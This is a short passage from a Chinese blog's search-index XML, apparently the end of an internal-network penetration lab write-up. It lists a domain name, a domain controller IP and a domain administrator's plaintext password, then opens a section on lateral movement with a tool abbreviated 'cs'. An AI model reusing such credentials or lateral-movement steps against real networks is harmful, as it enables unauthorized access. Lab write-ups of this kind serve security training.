class="line">域为god.org</span><br><span class="line">域控IP为192.168.52.138</span><br><span class="line">域管理员Administrator</span><br><span class="line">密码 Root12345</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="利用cs完成横向移动"><a href="#利用cs完成横向移动" class="headerlink" title="利用cs完成横向移动"></a>利用cs完成横向移动</h3>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
